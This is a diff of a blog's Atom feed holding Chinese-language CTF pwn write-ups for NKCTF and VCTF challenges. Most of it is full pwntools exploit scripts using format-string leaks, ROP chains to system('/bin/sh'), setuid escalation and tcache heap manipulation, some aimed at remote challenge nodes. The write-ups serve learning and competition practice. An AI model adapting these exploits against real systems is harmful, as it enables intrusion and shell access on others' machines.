+p.sendlineafter(&quot;payload\n&quot;,b&quot;%4198624c%11$ln&quot;)
+p.sendlineafter(&quot;payload\n&quot;,b&quot;/bin/sh&quot;)
+
+p.interactive()
+</code></pre>
+<h1 id="za1yunti4n">Za1Yunti4n</h1>
+<p>这个题，emmmmm，用C++写的，代码非常多，分析程序发现只要购买到小卖部就可以拿到shell，看三次战队vip就可以把自己的钱变成负数，买到小卖部，不用脚本</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[NKCTF]]></title>
+        <id>https://l1u66.github.io/post/nkctf/</id>
+        <link href="https://l1u66.github.io/post/nkctf/">
+        </link>
+        <updated>2024-03-26T10:51:59.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="leek">leek</h1>
+<p><img src="https://l1u66.github.io//post-images/1711364307553.png" alt="" loading="lazy"><br>
+发现先读取了6个字符，然后使用stdout的实际地址对每个字符取余，信安数基刚学了孙子定理(中国剩余定理)，网上直接有现成的python脚本，然后猜libc版本（恶心至极），利用栈溢出拿到shell</p>
+<pre><code>from pwn import*
+from LibcSearcher import *
+import math
+#p = process(&quot;./leak&quot;)
+p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;,31660)
+elf = ELF(&quot;./leak&quot;)
+libc = elf.libc
+context(log_level='debug',arch='amd64',os='linux')
+
+def Get_Mi(m_list, m):
+    M_list = []
+    for mi in m_list:
+        M_list.append(m // mi)
+    return M_list
+
+
+def Get_resMi(M_list, m_list):
+    resM_list = []
+    for i in range(len(M_list)):
+        resM_list.append(Get_ni(M_list[i], m_list[i])[0])
+    return resM_list
+
+
+def Get_ni(a, b):
+    if b == 0:
+        x = 1
+        y = 0
+        q = a
+        return x, y, q
+    ret = Get_ni(b, a % b)
+    x = ret[0]
+    y = ret[1]
+    q = ret[2]
+    temp = x
+    x = y
+    y = temp - a // b * y
+    return x, y, q
+
+
+def result(a_list, m_list):
+    for i in range(len(m_list)):
+        for j in range(i + 1, len(m_list)):
+            if 1 != math.gcd(m_list[i], m_list[j]):
+                print(&quot;不能直接利用中国剩余定理&quot;)
+                return
+    m = 1
+    for mi in m_list:
+        m *= mi
+    Mi_list = Get_Mi(m_list, m)
+    Mi_inverse = Get_resMi(Mi_list, m_list)
+    x = 0
+    for i in range(len(a_list)):
+        x += Mi_list[i] * Mi_inverse[i] * a_list[i]
+        x %= m
+    return x
+
+
+if __name__ == '__main__':
+	#gdb.attach(p)
+	payload = b'\x65' + b'\x67' + b'\x6b' + b'\x6d' + b'\x71' + b'\x7f'
+	p.sendafter(&quot;secret\n&quot;,payload)
+	a_list = [1,2,3,4,5,6]
+	for i in range(0,6):
+		a_list[i] = ord(p.recv(1))
+		
+	t = ord(p.recv(1))
+	m_list = [0x65,0x67,0x6b,0x6d,0x71,0x7f]
+	print(a_list)
+	print(t)
+	print(&quot;最终结果为：&quot;)
+	out = result(a_list, m_list)
+	while out%0x1000!=0x780:
+		out += 0x195682D1EC3
+	print(hex(out))
+	base = out - libc.sym['_IO_2_1_stdout_']
+	print(hex(base))
+	sys = base + 0x50D70
+	sh = base + 0x1D8678
+	t += 11*8
+	rdi = base + 0x2a3e5
+	ret = base + 0x29139
+	payload = p64(ret) + p64(rdi) + p64(sh) + p64(sys) + p8(t)
+	#pause()
+	p.send(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="maimai">maimai</h1>
+<p>前面有个判断逻辑，随便填了填就能过去，利用格式化字符串泄露cannary和libc地址，利用栈溢出拿到shell，但是拿到shell后发现open被ban掉了，没有打开flag的权限，所以在调用system函数前调用setuid(0)函数提权（关于这一点在begingame中的unhappy那道题中有提及，但是当时复现时看了眼wp得知要用orw，所以直接用orw来做了，没管提权的事，以后再也不看wp做题了🤡）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+#context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#p = process('./pwn')
+p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;,32996)
+
+#gdb.attach(p)
+p.sendlineafter(b&quot;option:\n&quot;,b'1')
+sleep(1)
+for i in range(49):
+	p.sendline(b&quot;15.0 SSS+&quot;)
+	
+p.sendlineafter(&quot;rank.\n&quot;,b&quot;15.0 SS&quot;)
+p.sendlineafter(b&quot;option:\n&quot;,b'2')
+#pause()
+p.sendlineafter(b&quot;nickname.\n&quot;,b'%11$p')
+p.recvuntil(&quot;0x&quot;)
+can = int(p.recv(16),16)
+print(&quot;can  =&quot;,hex(can))
+
+p.sendlineafter(b&quot;maimai?\n&quot;,b'aaaaaaaa')
+p.sendlineafter(b&quot;option:\n&quot;,b'2')
+p.sendlineafter(b&quot;nickname.\n&quot;,b'%13$p')
+p.recvuntil(&quot;0x&quot;)
+libc = int(p.recv(12),16) + 0x30 - 0x29dc0
+print(&quot;libc  =&quot;,hex(libc))
+
+rdi = libc + 0x2a3e5
+rdx = libc + 0x11f2e7
+rsi = libc + 0x2be51
+ret = libc + 0x29139
+sh = libc + 0x1D8678
+sys = libc + 0x50D70
+uid = libc + 0xEC0D0
+
+payload = b'a'*40 + p64(can) + p64(0xdeadbeef) + p64(rdi) + p64(0) + p64(uid) + p64(rdi) + p64(sh)  + p64(sys) 
+#pause()
+p.sendlineafter(b&quot;maimai?\n&quot;,payload)
+
+p.interactive()
+</code></pre>
+<h1 id="pallu">pallu</h1>
+<p>比赛的时候就没看到gift这里末尾没置0🤡，就看到设置标签时可能有个溢出，学习wp后发现是通过gift泄露libc基地址和栈地址，通过起名也能泄露堆地址，主要攻击思路就是把在栈上申请堆块，控制执行流</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./pallu')
+
+def get(idx):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;1&quot;)
+	p.sendlineafter(&quot;index:&quot;, str(idx))
+
+def gift(content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;8&quot;)
+	p.sendlineafter(&quot;code:&quot;, content)
+    	
+def kill(idx):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;5&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx))
+
+def sset(idx, content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;2&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx))
+	p.sendlineafter(&quot;Labels:&quot;, content)
+	
+def breed(idx1,idx2,content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;4&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx1))
+	p.sendlineafter(&quot;x:&quot;, str(idx2))
+	p.sendlineafter(&quot;(y/n)&quot;, b'y')
+	p.sendafter(&quot;name:&quot;, content)
+def exit_():
+	p.sendlineafter(&quot;choice:&quot;, b&quot;10&quot;)
+
+
+#gdb.attach(p)
+gift(b'a'*15)
+libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x3c38e0
+print(&quot;libc = &quot;,hex(libc))
+gift(b'a'*71)
+stack = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x20
+print(&quot;stack = &quot;,hex(stack))
+
+get(1)#0x500
+get(2)#0x930
+breed(0,1,b'h'*0x10)
+p.recvuntil(b'h'*0x10)
+p.recvuntil(b'h'*0x10)
+heap = u64(p.recv(6).ljust(8,b'\x00')) - 0x950
+print(&quot;heap = &quot;,hex(heap))
+kill(2)
+kill(1)
+kill(0)
+get(3) 
+get(3) 
+kill(0) 
+get(1) 
+get(1) 
+kill(2) 
+sset(0,b'g'*0x500+p64(0)+p64(0x221)+p64(0x7f8796c7ad78-0x7f87968b7000+libc)+p64(stack-0x30))
+giftcode=b'Happy NKCTF2024!'
+giftcode=giftcode.ljust(0x10,b'\0')
+giftcode+=p64(0)+p64(0)+p64(stack-0x30)+p64(0)
+giftcode+=p64(0)+p64(0)+p64(heap)+p64(stack-0x50)
+
+gift(giftcode)
+#pause()
+print(&quot;send giftcode2&quot;)
+gift(b'Welcome PalluWorld!')
+
+one=libc+0x4525a
+
+sset(3,b'\x00'*4*8+p64(0xdeadbe00)+p64(one)+p64(0)*10)
+
+exit_()
+
+p.interactive()
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VCTF纳新赛]]></title>
+        <id>https://l1u66.github.io/post/vctf-na-xin-sai/</id>
+        <link href="https://l1u66.github.io/post/vctf-na-xin-sai/">
+        </link>
+        <updated>2024-03-19T13:26:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ezhp_code">ezhp_code</h1>
+<h2 id="add函数">add函数</h2>
+<p><img src="https://l1u66.github.io//post-images/1710941694813.png" alt="" loading="lazy"><br>
+程序有后门函数，并且add功能中存在漏洞<br>
+<img src="https://l1u66.github.io//post-images/1710941285882.png" alt="" loading="lazy"><br>
+如果a1+40的位置有值，则直接执行，但是程序在del功能中将该位置置0，但是未对内容的堆清零，所以设法把内容chunk分配给漏洞chunk，但是按tchace的先进后出特性无法实现，发现限制8个chunk，所以把tchace堆填满即可实现<br>
+<img src="https://l1u66.github.io//post-images/1710941419440.png" alt="" loading="lazy"></p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./pwn')
+sys = 0x4012A5
+
+def add(size):
+	p.sendlineafter(&quot;exit\n&quot;, &quot;1&quot;)
+	p.sendlineafter(&quot;name:\n&quot;, b'a'*40 + p64(sys))
+	p.sendlineafter(&quot;say:\n&quot;, str(size))
+	p.sendlineafter(&quot;say:\n&quot;, b'a'*40 + p64(sys))
+    	
+def dele():
+	p.sendlineafter(&quot;exit\n&quot;, &quot;2&quot;)
+	
+#gdb.attach(p)
+add(71)
+add(71)
+add(71)
+add(71)
+dele()
+dele()
+dele()
+dele()
+#pause()
+p.sendlineafter(&quot;exit\n&quot;, &quot;1&quot;)
+
+#pause()
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+</feed>
